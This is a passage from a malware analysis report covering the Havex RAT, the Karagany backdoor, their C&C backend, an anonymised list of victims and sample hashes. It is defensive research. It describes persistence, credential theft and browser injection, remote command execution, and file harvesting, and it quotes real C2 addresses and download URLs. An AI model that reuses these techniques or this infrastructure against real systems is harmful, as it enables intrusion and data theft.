from\n“HKEY_LOCAL_MACHINE” or “HKEY_CURRENT_USER” depending\non access rights.\n\n“KeyWork” will hold “SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion”, either from “HKEY_\nLOCAL_MACHINE” or “HKEY_CURRENT_USER” depending\non access rights.\n\nThe “CheckAccessLM” and “CheckAccessCU” methods check for access to Local Machine and Current\nUser, respectively.\n\nIf the LOCAL MACHINE isn’t accessible the following error message is displayed “LM error: error\nreason”, otherwise “LM no error”.\n\nIf the CURRENT MACHINE isn’t accessible the following error message is displayed “CU error: error\nreason”, otherwise “CU no error”.\n\nIf for some reason, neither “SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion” from Local\nMachine nor Current User is accessible, the following\n“HKEY_CURRENT_USER\\\\SOFTWARE\\\\Microsoft\\\\Internet Explorer\\\\InternetRegistry” will be\nused for “KeyWork”.\n\nOnce the registry keys are identified, the debug message “run-work done” is displayed.\n\nThe malware prints both KeyRun and Keywork and continues execution.\nA subkey is added to KeyRun to automatically start the malware when Windows reboots.\nThe name of that subkey comes from the “version information” entry of the resource section where\nthe internal and original file name can be found.\n\n\n-----\n\nThe full path of the malware is set and the malware can now survive reboot. The debug message\n“work” is displayed.\n\n**5.1.4 Run-work done 2**\n\nThe next step focuses on the Keywork registry key.\nThe following subkeys are checked and created if not present in Keywork\\\\[name_from_version_\ninformation] : “done”, “doneEXT”, “work”, “settings” and “servers”.\n\nThey hold not any value at this point. This part is ended by a debug message: “run-work done 2”\n\n**5.1.5 Generating BotID and filling subkeys**\n\nImmediately after checking for special subkeys, the IDget method is called.\nIf the “id” subkey doesn’t exist, the method IDset is called and a new BOTID is created and stored as\na Base64 encoded string.\n\nAfterwards, the IDget method is called and the BOTID is Base64 decoded from the registry and\nsaved for later use in prSettings.id.\n\nIt does the same for “prSettings.priv”, “prSettings.pub”, “prSettings.timeout” and “prSettings.\nservers”, each time checking whether a value is already set, and creating one if not.\n\nThe developers made a mistake. The “prSettings.priv” is set using the IDget method instead of\nthe KeyPrivGet method. However, this makes little difference since KeyPubGet, KeyPrivGet and\nIDget are wrappers to the GenerateID methods. This could have introduced a serious flaw if those\nparameters were used in a secure scheme:\n\nCorrect for Pub:\n\nif (this.KeyPubGet(prSettings.KeyWork) == null)\nthis.KeyPubSet(prSettings.KeyWork);\nprSettings.pub = this.KeyPubGet(prSettings.KeyWork);\n\nIncorrect for Priv:\n\nif (this.KeyPrivGet(prSettings.KeyWork) == null)\nthis.KeyPrivSet(prSettings.KeyWork);\nprSettings.priv = this.IDget(prSettings.KeyWork);  <--- mistake\n\n\n-----\n\nOnce it is done filling the prSettings structure, the debug message “settingcheck done” is displayed.\n\n**5.2 Network communication - AnsSend**\n\nThe next method called by our trojan is “AnsSend”. It stands for “Answer Send”.\nIt starts with the debug message “ANSWER”.\n\nThis part of the code looks into the registry, specifically into the “KeyWork\\\\[name_from_version_\ninformation]\\\\done” and doneEXT subkeys\nto see if there is anything ready to be posted to the C&C server. Those subkeys should be empty\nat this stage, since the Answers are only created after a task received from the C&C server is\ncompleted.\n\nShould answers be available, their numbers would be printed as a debug message and processed\nand the following would be displayed as a debug message:\n\nANSWER\n1 (meaning one answer)\nConnecting post: HTTP:\\\\C&C server with botID as parameter\n8 (size of answer * 2 as it is converted to unicode)\nreqstream\nwrote to stream\n\nThis essentially does a POST request to the C&C server using the BOTID and the following User\nAgent: “Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.0”\nOn the C&C server side, a new file would be created named after the BOTID with the extension\n“.ans”.\n\nHere is an example of such a file:\n\nThe date of the post can be found, the base64 encoded C&C server and the unicode string Answer,\nmodified in this example.\n\nThis is how the attackers get an answer (result) from a given task.\n\n**5.3 Network communication - WorkReceive**\n\nThe WorkReceive function essentially does a GET request on the C&C server in order to receive a\ntask to complete on the infected computer The task to execute is encrypted and base64 encoded\n\n\n-----\n\nand returned between the “havex” tags. Here is an example without any task between the tags:\n\nThe trojan calls the DataParser to locate the task:\n\nThe task is decrypted, decoded and stored in the “KeyWork\\\\[name_from_version_information]\\\\\nwork” subkey.\n\n**5.4 WorkBegin - Task Dispatcher**\n\nJust before the WorkBegin method is called, the “begin work” debug message is displayed.\nThe first thing WorkBegin does is decrypt and unbase64 the answer returned from the DataParser.\n\nAfterwards, two things are extracted: The command to execute and the data parameter for the\ncommand.\n\n**5.5 The Commands**\n\nThe final step calls the command dispatcher, which executes the command sent by the attackers.\n\n**5.5.1 SCR**\n\nThe “SCR” command is used by the attacker to request a Screen Capture of the infected computer.\nTypical GDI functions are used, including: CreateCompatibleDC, GetSystemMetrics and\nCreateCompatibleBitmap.\nThe screenshots are made as JPG files. If a screenshot already exist, it is deleted prior the creation of\na new one.\n\n**5.5.2 DIR / DIS**\n\nThe “DIR” and “DIS” commands are used to generate Directory listings using the XML format.\n\n\n-----\n\n**5.5.3 TIM**\n\nThe TIM command is responsible for updating the Timeout parameter in the registry.\nThe command finds where the KeyWork is located and updates the Time out with the parameter\nprovided to the command.\n\n**5.5.4 UPD**\n\nThe UPD command is used to run an updated version of the RAT. The currently running RAT\nexecutes the update and exits. Upon execution, the newly updated version will delete the old RAT\nusing the Cleaner method described earlier.\n\n**5.5.5 FID**\n\nChange Folder attributes.\n\n**5.5.6 LIB**\n\nThe LIB command is used to load a DLL on the infected machine. It simply uses LoadLibrary.\n\n**5.5.7 FIR**\n\nThe FIR command is used to run an executable on the infected computer. The process is created\nwith hidden windows to stay unnoticed.\n\n**5.5.8 UPS**\n\nThe UPS command is used to update the C&C server in the registry.\n\n**5.5.9 FIS**\n\nThe FIS command is used to check if the file passed as parameter exists on the infected computer.\n\n**5.5.10 FIT**\n\nThe FIT command is used to delete a file passed as parameter to the command if it exists on the\ninfected computer.\n\n**5.5.11 CMD**\n\n\n-----\n\nThe CMD command is used to execute a command on the infected machine using cmd.exe\n\n**5.5.12 KEY**\n\nThe KEY command is used to update the Priv and Pub key in the registry.\n\n**5.6 Sleep and Loop again**\n\nOnce the commands have been executed, the debug message “End work” is displayed.\nThe malware then sleeps for a random amount of time and the main loop continues.\nIf the commands were executed, all results stored in the registry will be POSTED to the server via\nthe AnsSend method.\n\nThe malware loops forever waiting for new orders from the attackers.\n\n\n-----\n\n# VI. Appendix 6: Karagany backdoor – detailed analysis\n\n**1st stage samples**\n\nSHA-256: 1b3cf050d626706d32c1c2c1cbd4975d519cfbdb9bca0f2e66b7e1120030b439\nsize: 538152\ntimestamp: Fri, 19 Jun 1992 22:22:17 UTC\nsources: hXXp://lafollettewines.com/blog/wp-includes/pomo/inden2i.php?dwl=fne\nhXXp://kenzhebek.com/tiki/files/templates/listpages/inden2i.php?dwl=fne\ndropped as:  dxpserver.exe, corensys.exe, wbemmonitor.exe\ndetected as: Trojan.Win32.Benban.yc\n\nSHA-256: b1a3e67200a3837ecf45481885c2eca88f89509443a0bcec01b12aa737007a9b\nsize: 248360\ntimestamp: Fri, 19 Jun 1992 22:22:17 UTC\ndetected as: Trojan-Dropper.Win32.Clons.aqwj\n\nSHA-256: fcf7bfe68ff302869475b73e4c605a099ed2e1074e79c7b3acb2a451cd2ea915\nsize: 271400\ntimestamp: Fri, 19 Jun 1992 22:22:17 UTC\n\nsource: www.nahoonservices.com/wp-content/plugins/rss-poster/juch.php\ndropped as: searchindexer.exe\ndetected as: Trojan-Dropper.Win32.Clons.ampw\n\nSHA: a553384eeadf4ad39e6c89bf16a146c01ebf627d042485844d75cd67b421afb8\nsize: 248360\ntimestamp: Fri, 19 Jun 1992 22:22:17 UTC\nsignature: Trojan-Dropper.Win32.Clons.apvc\n\nThis backdoor comes packed with UPX and a custom Delphi packer. The Delphi packer contains antidebugging tricks and code especially crafted to overrun sandbox mechanisms. The packer unpacks and\nexecutes the main binary in several stages, creating multiple separated processes and threads.\n\n**Code flow:**\n\n- Check OS version, install date, username and system metrics\n\n\n-----\n\n- Copy self to %APPDATA%\\<mal_folder_name>\\<mal_filename>.exe, where <mal_folder_name> and\n\n<file_name> are chosen from the list of strings hardcoded in the binary\n\n- Set attribs of the copied dropper to hidden & system\n\n- Move the original dropper to <dropper_path>err.log<rand_nr>\n\n- Set file attributes to hidden & temporary\n\n- Use MoveFileWithProgress to delete the original dropper on the next reboot\n\n- Copy %SYSTEM%chkdsk.exe file to the path and filename of the original dropper\n\n- Copy %SYSTEM%chkdsk.exe to “%APPDATA%\\<mal_folder_name>\\<mal_filename> .exe “ (with the\nspace at the end)\n\n- Create folder %APPDATA%\\<mal_folder_name>\\plugs\n\n- Use COM objects (IShellLink `&IPersistFile interfaces) to create a link in the Startup folder`\n\n- Extract the credentials from Internet Explorer’s password manager and save them to <mal_\n```\n  folder_name>\\prx.jpg file; keep monitoring the credentials in loop and updating the file\n\n```\n- Check if any browser process is running and if so, inject the DLL spying on the basic authentication\ncredentials sent via HTTP traffic; affected browsers include Internet Explorer, Firefox, Mozilla and Opera\n\n- Check Internet connection by sending GET request to adobe.com/geo/productid.php and\n```\n  microsoft.com/en-us/default.aspx\n\n```\n- If Internet is working, initiate the communication with C2 (the IP address is hardcoded in the\nbinary) by sending the following post request\n\nPOST 93.188.161.235/check_value.php?identifiant=51032_861222508099&version=ver4_2\n\n- Await commands\n\n- If the C2 is not available, create an empty file: <mal_folder_name>\\inact.api\n\n- Create C:\\ProgramData\\Mail\\MailAg\\gl directory\n\n- Create a thread that monitors this directory and sends the content of files found inside it to the C2\nserver; the data is encrypted with a combination of XOR and other bitwise operations before sending\n\n**List of backdoor commands:**\n\n- Cownexec\n\n- Cownadminexec\n\n- Updateme\n\n- Deleteplugin\n\n- Loadplugin\n\n- Xdiex\n\n- Xrebootx\n\n- Xmonstart - start monitoring the C:\\ProgramData\\Mail\\MailAg\\gl dir and send file content to\nthe C2\n\n- Xmonstop - stop monitoring\n\n- Xgetfile\n\n- Xec2 another routine to execute a binary\n\n\n-----\n\n- Xfrost\n\n- Killklg\n\nList of strings used as folder name and filename:\n\n\nFolder name File name\n\n\nMicrosoft WCF services SearchIndexer\n\nBroker services ImeBroker\n\nFlash Utilities fsutil\n\nMedia Center Programs; PnPutil\n\nPolicy Definitions BdeUISrv\n\nMicrosoft Web Tools WinSAT\n\nReference Assemblies pwNative\n\nAnalysis Services SnippingTool\n\nInstallShield Information DFDWizard\n\nIIS SQL Server PrintBrmEngine\n\nDiagnostics; WbemMonitor\n\nNTAPI Perfomance dxpserver\n\nWPF Platform PowerMng\n\n\n**2nd stage samples (modules)**\n\n**Screenshot module**\n\nSHA-256: 05fb04474a3785995508101eca7affd8c89c658f7f9555de6d6d4db40583ac53\nSize: 823289\nTimestamp: Fri, 07 Jun 2013 08:05:56 UTC\nSource: 91.203.6.71/check2/muees27jxt/scs.exe\nDetected as: Trojan-PSW/Karagany (Microsoft, Norman);\n\nThis EXE copies the additional MZ from its overlay to C:\\ProgramData\\Cap\\Cap.exe and runs this\nfil i f ll i d\n\n\n-----\n\n```\n“C:\\cmd.exe /c C:\\ProgramData\\Cap\\Cap.exe /d C:\\ProgramData\\Mail\\MailAg /f scs.jpg >\nC:\\ProgramData\\Mail\\MailAg\\scs.txt”\n\n```\nThen it deletes the directory C:\\ProgramData\\Cap and all the files in it, deletes itself and exits.\n\nIt uses encrypted strings - XOR with progressively incremented value.\n\n3rd stage 3rd party screenshot tool\n\nSHA256: 150ffd226b8a0d7cabe295b6ad3d256e5aa273a968b5b700b1a5bdbebf088fa7\nSize: 696320\nTimestamp: Fri, 16 Apr 2010 07:47:33 UTC\n\nCap.exe is indeed the DuckLink CmdCapture tool - a 3rd party freeware AutoIt application (AutoIt\nversion 3.3.6.1) for capturing the screenshots, available here\nhttp://www.ducklink.com/p/download/\n\nThis application is dropped by the scs.exe module and run using following command line parameters:\n```\n/d C:\\ProgramData\\Mail\\MailAg /f scs.jpg > C:\\ProgramData\\Mail\\MailAg\\scs.txt\n\n```\nThe /d parameter specifies the destination directory\nThe /f parameter specifies the filename for the screenshot file.\n\nText output produced by application is redirected to the C:\\ProgramData\\Mail\\MailAg\\scs.txt file\nand contains information such as:\n\n- Day and time of capture\n\n- Computer name\n\n- Username\n\n- Cpu architecture\n\n- Os version\n\n- IP address\n\n- Logon domain and logon server\n\n- Desktop details (height, width, depth, refresh rate)\n\n- Environmental variables\n\nDescription of the DuckLink CmdCapture functionalities from the README file that comes with the\napplication:\n\n_This freeware program designed to capture images of the screen_\n\n\n-----\n\n_Main Features:_\n\n_* Full Screen Capture (display selection support)._\n\n_* Window Capture._\n\n_* Selected area capture._\n\n_* Save captured image in silent mode._\n\n_* Open captured image in graphic editor._\n\n_* Print captured image._\n\n_* Put captured image to clipboard._\n\n_* Upload captured image (to image hosting services)._\n\n_* Images format support:_\n_PNG_\n_GIF_\n_JPG - Quality can be set._\n_BMP - Format can be set._\n\n**Example of part of the content of the scs.txt file:**\n```\n@HOUR: Hours value of clock in 24-hour format. Range is 00 to 23\nSample Value: 23\n@MDAY: Current day of month. Range is 01 to 31\nSample Value: 22\n@MIN: Minutes value of clock. Range is 00 to 59\nSample Value: 19\n@MON: Current month. Range is 01 to 12\nSample Value: 07\n@MSEC: Milliseconds value of clock. Range is 00 to 999\nSample Value: 050\n@SEC: Seconds value of clock. Range is 00 to 59\nSample Value: 52\n@WDAY: Numeric day of week. Range is 1 to 7 which corresponds to Sunday through\nSaturday.\nSample Value: 3\n@YDAY: Current day of year. Range is 001 to 366 (or 001 to 365 if not a leap year)\nSample Value: 203\n@YEAR: Current four-digit year\nSample Value: 2014\n@ComputerName: Computer’s network name.\nSample Value: WINXP\n\n```\n@ComSpec al e of %comspec% the SPECified secondar COMmand interpreter primaril for\n\n\n-----\n\n```\ncommand line uses, e.g. Run(@ComSpec & “ /k help | more”)\nSample Value: C:\\WINDOWS\\system32\\cmd.exe\n@CPUArch: Returns “X86” when the CPU is a 32-bit CPU and “X64” when the CPU is 64-bit.\nSample Value: X64\n@HomeShare: Server and share name containing current user’s home directory.\nSample Value:\n\n```\n@IPAddress1: IP address of first network adapter. Tends to return 127.0.0.1 on some\n```\ncomputers.\nSample Value: 192.168.56.11\n@IPAddress2: IP address of second network adapter. Returns 0.0.0.0 if not applicable.\nSample Value: 0.0.0.0\n@IPAddress3: IP address of third network adapter. Returns 0.0.0.0 if not applicable.\nSample Value: 0.0.0.0\n@IPAddress4: IP address of fourth network adapter. Returns 0.0.0.0 if not applicable.\nSample Value: 0.0.0.0\n@LogonDNSDomain: Logon DNS Domain.\nSample Value:\n@LogonDomain: Logon Domain.\nSample Value: WINXP\n\n```\n--- snip --\n**File listing module**\n\nSHA-256: 07bd08b07de611b2940e886f453872aa8d9b01f9d3c61d872d6cfe8cde3b50d4\nSize: 15872\nTimestamp: Tue, 02 Jul 2013 12:41:47 UTC\nSource: 91.203.6.71/check2/muees27jxt/fl.exe\nDetected as: HEUR:Trojan.Win32.Generic\n\nModule listing file.\nSaves a list of documents that have specified extensions or contain specified strings in the file name to the C:\\\nProgramData\\Mail\\MailAg\\fls.txt file. Saved information includes path, size and modification time.\n\nFile matching patterns:\n\n\n*pass*.* *.rtf *.xls *.pdf\n\n*secret*.* *.pst *.doc *.vmdk\n\n*.pgp *.p12 *.mdb *.tc\n\n\n-----\n\n# VII. Appendix 7: C&C Analysis\n\nThe C&C Backend is written in PHP, consisting of 3 files.\n\n**“log.php” is a Web-Shell, used for file level operations.**\n\n**“testlog.php” is not a PHP-script but it contains the C&C Server logfile of Backdoor-connections.**\nPlease see “source.php” below for further information.\n\n**“source.php”**\n\nThe Backdoors interact with “source.php”, which is the control script. Following the functions on\nexecution:\n\n1. Collects the following Information:\n\n\n**Information** **Syntax/content** **Used (written to log)**\n\n\nTimestamp day-month-year hour:minute-second Yes\n\n\nIP-address checks and return valid IP-address\n\nfrom HTTP-Request (“HTTP_CLIENT_\n```\n            IP”, “HTTP_X_FORWARDED”, “HTTP_X_\n            iFORWARDED_FOR”, “REMOTE_ADDR”)\n\n```\n\nYes\n\n\nHost reverse lookup of IP-address No\n(gethostbyaddr)\n\nProxy Proxy-IP-address if Bot connected through No\nProxy\n\nUserAgent UserAgent from HTTP-Request Yes\n\nRequest-URI string of URI requested by Bot Yes\n\nBotID BotID transferred with HTTP-request Yes\n\n\n2. Writes the above information to “testlog.php”, separated by “Tabulator” and base64-encoded,\nwith the following syntax:\n\n\n-----\n\n```\n  <timestamp>\\t<victim ip-address>\\t<proxy>\\t<botID>\\t<request-uri>\\t<useragent>\n\n```\n3. Writes all transferred HTTP-GET Variables to “<botID>.log”, separated by “Tabulator” and\nbase64-encoded.\n4. If the bot executed an HTTP-POST-request, the transferred data is written to the file “<botID>.\n```\n  ans”, enclosed in “xdata”-Tag with timestamp. (“ans” is the acronym for “Answer”)\n\n```\n5. Checks for any file “<botID>_*.txt”\n\na.  If found the timestamp, filename and Status “sent” are first appended to “<botID>.log”.\nThen the file content is transferred to the bot, embedded into HTML with HTML-Body “No\ndata!” and HTML-Comment “Havex” containing the data to be transferred. Finally the file on\nthe server will be removed. If removal fails it’s logged to “<botID>.log”.\n\nb.  If no matching file is found, a HTML-Response is sent with an empty “Havex” HTMLComment and HTML-Body text “Sorry, no data corresponding to your request.”\n\n\n-----\n\n# VIII. Appendix 8: Victim identification\n\nThe page below shows a brief description of the identified victims including information about the\ncompany and the sector on which they operates. A total of 101 victims have been identified.\n\n**Victim 1**\nOffers a complete range of manufacturing processes including precision injection molding, cleanroom\nmolding and assembly, sheet metal fabrication, supply chain management and distribution.\n\n**Victim 2**\nUkrainian wholesale suppliers for the pharmaceutical market.\n\n**Victim 3**\nGeneral contracting, design build and construction management company; based in Alabama.\n\n**Victim 4**\nCompany performing web developing, hosting, consulting and content management.\n\n**Victim 5**\nUniversity in Ukraine.\n\n**Victim 6**\nDevelops larger machines for international manufacturers – Ireland.\n\n**Victim 7**\nSchool in Tennessee.\n\n**Victim 8**\nSpecial Purpose Machines. Working in several sectors including the pharmaceutical, automotive,\nprinting or plastic industry.\n\n**Victim 9**\nCorporation - Area of activity : Adult Internal Medicine, Infectious Disease, Pediatrics, OB/GYN,\nDentistry, Psychology, Psychiatry, Social Services\n\n**Victim 10**\n\n\n-----\n\n**Victim 11**\nDistributor for construction machinery, energy systems and Caterpillar brand equipment.\n\n**Victim 12**\nOne of Northern Ireland’s most respected and innovative construction companies.\n\n**Victim 13**\nSupplier of IT services and products.\n\n**Victim 14**\nMulti-trade company providing high quality electrical, HVAC, IT, across the country (US).\n\n**Victim 15**\nArea of activity: Packaging systems. HQ in Switzerland.\n\n**Victim 16**\nWeb development and hosting including ERP and commercial implementation and consulting\nservices. HQ: Chile\n\n**Victim 17**\nCar dealer in Arizona\n\n**Victim 18**\nIT Australia - provides systems to streamline management and governance processes.\n\n**Victim 19**\nIntegrated online marketing agency. Russia.\n\n**Victim 20**\nDesign and manufacture of standard and custom leak test machines.\n\n**Victim 21**\nUniversity in Spain.\n\n**Victim 22**\nTowing/hauling solutions to the commercial trucking industry. Located coast to coast in the U.S.,\nCanada, Europe, Australia and Mexico.\n\n**Victim 23**\nUniversity in Poland\n\n\n-----\n\n**Victim 24**\nAreas of activity: recycling, mining and food sorting.\n\n**Victim 25**\nSystems integrator located in North Carolina. Specializes in the design and implementation of SCADA systems.\n\n**Victim 26**\nCity council - Poland.\n\n**Victim 27**\nUniversity in China.\n\n**Victim 28**\nCleaning solutions.\n\n**Victim 29**\nManufacturer of flexible packaging and advanced laminate design solutions.\n\n**Victim 30**\nCustom manufacturing of complex three-dimensional sheet metal parts.\n\n**Victim 31**\nSpecializes in mechanical engineering. Area of activity: Laminating-Machines, Used-Machinery.\n\n**Victim 32**\nStructural engineering field in every major market sector and construction type. California.\n\n**Victim 33**\nCourier services worldwide. Greece.\n\n**Victim 34**\nInstitute of Physics. Croatia\n\n**Victim 35**\nSupplies public sector organizations with products and contracts. UK.\n\n**Victim 36**\nUniversity in Spain.\n\n**Victim 37**\n\n\n-----\n\nUniversity in Poland.\n\n**Victim 38**\nUniversity in Poland.\n\n**Victim 39**\nResearch & Education Network. USA.\n\n**Victim 40**\nUniversity in Germany.\n\n**Victim 41**\nAmerican multinational technology and consulting corporation.\n\n**Victim 42**\nCreates and manages international private WANs for large multinational companies.\n\n**Victim 43**\nInformatics Centre in India.\n\n**Victim 42**\nHealth authority in Canada.\n\n**Victim 43**\nCounty Government in USA.\n\n**Victim 44**\nUniversity in USA.\n\n**Victim 45**\nAmerican multinational conglomerate corporation.\n\n**Victim 46**\nUnit within University in USA.\n\n**Victim 47**\nOperates high speed computer network in Turkey.\n\n**Victim 48**\nUniversity in Poland\n\n\n-----\n\n**Victim 49**\nTelecommunications and computing services. USA.\n\n**Victim 50**\nAmerican multinational document management corporation.\n\n**Victim 51**\nMajor electronic systems company based in France acting in areas such as defense, aerospace,\nairline security and safety, information technology, and transportation\n\n**Victim 52**\nSwiss multinational pharmaceutical company.\n\n**Victim 53**\nAmerican manufacturing conglomerate involved in aircraft, the space industry, defense-oriented and\ncommercial electronics, automotive and truck components.\n\n**Victim 54**\nIndustrial suburb in India.\n\n**Victim 55**\nInformation Technology company. Iran.\n\n**Victim 56**\nUniversity in China.\n\n**Victim 57**\nGlobal payments and technology company. USA.\n\n**Victim 58**\nCollege in USA.\n\n**Victim 59**\nUniversity in Germany.\n\n**Victim 60**\nUniversity in UK.\n\n**Victim 61**\n\n\n-----\n\nSupercomputing and Networking Center. Poland.\n\n**Victim 62**\nUniversity in Canada.\n\n**Victim 63**\nUniversity in USA.\n\n**Victim 64**\nUniversity in Spain.\n\n**Victim 65**\nAcademic and Research Network. Ukraine.\n\n**Victim 66**\nUniversity in Canada.\n\n**Victim 67**\nFront, middle, and back office services for global financial markets.\n\n**Victim 68**\nGreek Public Administration Network\n\n**Victim 69**\nUniversity in the USA.\n\n**Victim 70**\nUniversity in Russia.\n\n**Victim 71**\nAirport Authority in the USA.\n\n**Victim 72**\nMultinational manufacturer. Germany.\n\n**Victim 73**\nEnergy consumption analysis company.\n\n**Victim 74**\nUniversity in the USA\n\n\n-----\n\n**Victim 75**\nUniversity in Taiwan.\n\n**Victim 76**\nUniversity in Japan.\n\n**Victim 77**\nUniversity in Taiwan.\n\n**Victim 78**\nUniversity in the USA.\n\n**Victim 79**\nUniversity in the USA.\n\n**Victim 80**\nUniversity in Sweden.\n\n**Victim 81**\nUniversity in Poland.\n\n**Victim 82**\nPharma industry.\n\n**Victim 83**\nDigital content for education and research in the UK.\n\n**Victim 84**\nUniversity – weather research.\n\n**Victim 85**\nUniversity in South Korea.\n\n**Victim 86**\nConstruction management services.\n\n**Victim 87**\nEducation and Research Network, China.\n**Victim 88**\n\n\n-----\n\nCommunications network for science and research, Germany.\n\n**Victim 89**\nUniversity in the USA.\n\n**Victim 90**\nUniversity in Spain.\n\n**Victim 91**\nUniversity in South Korea.\n\n**Victim 92**\nAcademic and Research Network, Croatia.\n\n**Victim 93**\nEncryption technology Institute.\n\n**Victim 94**\nUniversity in the USA.\n\n**Victim 95**\nChemical company, Germany.\n\n**Victim 96**\nSchool, USA.\n\n**Victim 97**\nUniversity in Ukraine.\n\n**Victim 98**\nLiquefied natural gas, US energy demand.\n\n**Victim 99**\nUniversity in Poland.\n\n**Victim 100**\nAcademic and Research Network, Australia.\n\n**Victim 101**\nSpace research institute Russia\n\n\n-----\n\n# IX. Appendix 9: Hashes\n\nHavex, Sysmain, Ddex:\n\n022da314d1439f779364aba958d51b119ac5fda07aac8f5ced77146dbf40c8ac\n02e5191078497be1e6ea8bac93b6cfb9b3ee36a58e4f7dd343ac1762e7f9301e\n066346170856972f6769705bc6ff4ad21e88d2658b4cacea6f94564f1856ed18\n0850c39a7fcaa7091aaea333d33c71902b263935df5321edcd5089d10e4bbebb\n0a0a5b68a8a7e4ed4b6d6881f57c6a9ac55b1a50097588e462fe8d3c486158bf\n0c20ffcdf2492ccad2e53777a0885c579811f91c05d076ff160684082681fe68\n0e34262813677090938983039ba9ff3ade0748a3aba25e28d19e2831c036b095\n0ea750a8545252b73f08fe87db08376f789fe7e58a69f5017afa2806046380a5\n0f4046be5de15727e8ac786e54ad7230807d26ef86c3e8c0e997ea76ab3de255\n13da3fe28302a8543dd527d9e09723caeed98006c3064c5ed7b059d6d7f36554\n170e5eb004357dfce6b41de8637e1dbeb87fa58e8b54a2031aac33afb930f3c8\n1d768ebfbdf97ad5282e7f85da089e174b1db760f1cbdca1a815e8e6245f155a\n2221c2323fb6e30b9c10ee68d60b7d7be823911540bb115f75b2747d015e35f9\n24be375f0e11d88210e53f15cc08d72ab6c6287676c3fe3c6f70b513e5f442ed\n269ea4b883de65f235a04441144519cf6cac80ef666eccf073eedd5f9319be0f\n2c109406998723885cf04c3ced7af8010665236459d6fe610e678065994154d4\n\n2dc296eb532097ac1808df7a16f7740ef8771afda3ac339d144d710f9cefceb4\n2efd5355651db8e07613e74b1bf85b50273c1f3bce5e4edbedea0ccdff023754\n2f24c7ccbd7a9e830ed3f9b3b7be7856e0cc8c1580082433cbe9bf33c86193c6\n2f593c22a8fd0de3bbb57d26320446a9c7eed755ae354957c260908c93d8cf79\n3094ac9d2eeb17d4cda19542f816d15619b4c3fec52b87fdfcd923f4602d827b\n31db22caf480c471205a7608545370c1b3c0c9be5285a9ef2264e856052b66b4\n43608e60883304c1ea389c7bad244b86ff5ecf169c3b5bca517a6e7125325c7b\n487eaf5cc52528b5f3bb27ba53afffb6d534068b364a41fc887b8c1e1485795a\n49c1c5e8a71f488a7b560c6751752363389f6272d8c310fee78307dc9dcd3ee2\n4f3ceab96fb55d0b05380a1d95bb494ca44d7a9d7f10ded02d5b6fc27c92cb05\n4ff5f102f0f1284a189485fc4c387c977dd92f0bc6a30c4d837e864aed257129\n56a1513bcf959d5df3ff01476ddb4b158ce533658ab7d8dd439324b16f193ac2\n593849098bd288b7bed9646e877fa0448dcb25ef5b4482291fdf7123de867911\n59c4cba96dbab5d8aa7779eac18b67b2e6f8b03066eb092415d50dff55e43b72\n5a13d0c954280b4c65af409376de86ac43eb966f25b85973a20d330a34cdd9a6\n60f86898506f0fdf6d997f31deff5b6200a6969b457511cc00446bd22dd1f0a4\n\n\n-----\n\n61969cd978cd2de3a13a10510d0dea5d0d3b212209804563ed3d42033a9d0f54\n6367cb0663c2898aff64440176b409c1389ca7834e752b350a87748bef3a878b\n646c94a0194ca70fbe68c444a0c9b444e195280f9a0d19f12393421311653552\n65a4332dfe474a8bb9b5fa35495aade453da7a03eb0049211e57b5660d08d75c\n6606dd9a5d5182280c12d009a03b8ed6179872fcb08be9aa16f098250cc5b7a7\n66ec58b4bdcb30d1889972c1ee30af7ff213deece335f798e57ff51fe28752e3\n684ea2083f2f7099f0a611c81f26f30127ad297fcac8988cabb60fcf56979dfc\n698ec413986dc7fc761b1a17624ffffb1590902020b9d0cd5d9a6013c67d9100\n6e5f4296bffa7128b6e8fa72ad1924d2ff19b9d64775bd1e0a9ce9c5944bd419\n6e92c2d298e25bcff17326f69882b636150d2a1af494ef8186565544f0d04d3d\n7081455301e756d6459ea7f03cd55f7e490622d36a5a019861e6b17141f69bd0\n7a115335c971ad4f15af10ea54e2d3a6db08c73815861db4526335b81ebde253\n7c1136d6f5b10c22698f7e049dbc493be6e0ce03316a86c422ca9b670cb133aa\n7e0dafedd01d09e66524f2345d652b29d3f634361c0a69e8d466dcbdfd0e3001\n837e68be35c2f0ab9e2b3137d6f9f7d16cc387f3062a21dd98f436a4bcceb327\n83e57d8f3810a72a772742d4b786204471a7607e02fa445c3cd083f164cc4af3\n85d3f636b515f0729c47f66e3fc0c9a0aacf3ec09c4acf8bf20a1411edcdc40a\n8d343be0ea83597f041f9cbc6ea5b63773affc267c6ad99d31badee16d2c86e5\n8da93bc4d20e5f38d599ac89db26fc2f1eecbf36c14209302978d46fc4ce5412\n8e222cb1a831c407a3f6c7863f3faa6358b424e70a041c196e91fb7989735b68\n92c959c36617445a35e6f4f2ee2733861aa1b3baf8728d19a4fd5176f3c80401\n94d4e4a8f2d53426154c41120b4f3cf8105328c0cc5d4bd9126a54c14b296093\n98bd5e8353bc9b70f8a52786365bcdb28bd3aef164d62c38dae8df33e04ac11a\n9d530e2254580842574a740698d2348b68b46fd88312c9325321ad0d986f523d\na05b53260c2855829226dffd814022b7ff4750d278d6c46f2e8e0dc58a36a1f9\na2fe7a346b39a062c60c50167be7dd4f6a8175df054faa67bff33ec42b1072d9\na69fcc5c5409837985e1697012cd6cc5b4e13789dd755f2bcdab99b3aadc4cc2\na8e6abaa0ddc34b9db6bda17b502be7f802fb880941ce2bd0473fd9569113599\naafbf4bba99c47e7d05c951ad964ce09493db091ba5945e89df916c6fa95d101\nabdb2da30435430f808b229f8b6856fafc154a386ef4f7c5e8de4a746e350e0c\nb0faba6156c7b0cd59b94eeded37d8c1041d4b8dfa6aacd6520a6d28c3f02a5e\nb139829440aabe33071aa34604f739d70f9a0a3b06051f3190aabf839df2d408\nb3b01b36b6437c624da4b28c4c8f773ae8133fca9dd10dc17742e956117f5759\nb647f883911ff20f776e0a42564b13ef961fa584ebd5cfce9dd2990bca5df24e\nb8f2fdddf7a9d0b813931e0efe4e6473199688320d5e8289928fe87ce4b1d068\nbacac71fcc61db9b55234d1ccf45d5fffd9392c430cdd25ee7a5cea4b24c7128\nbcdcb4b5e9aaaee2c46d5b0ed16aca629de9faa5e787c672191e0bdf64619a95\nbee9f2a01e0049d4cf94016284b16849136233366d1509489797084672e5448f\nc25c1455dcab2f17fd6a25f8af2f09ca31c8d3773de1cb2a55acd7aeaa6963c8\nc4e2e341689799281eaef47de75f59edceaba281398b41fe7616436f247ab93d\n\n\n-----\n\nc66525285707daff30fce5d79eb1bdf30519586dfec4edf73e4a0845fd3d0e1c\nc987f8433c663c9e8600a7016cdf63cd14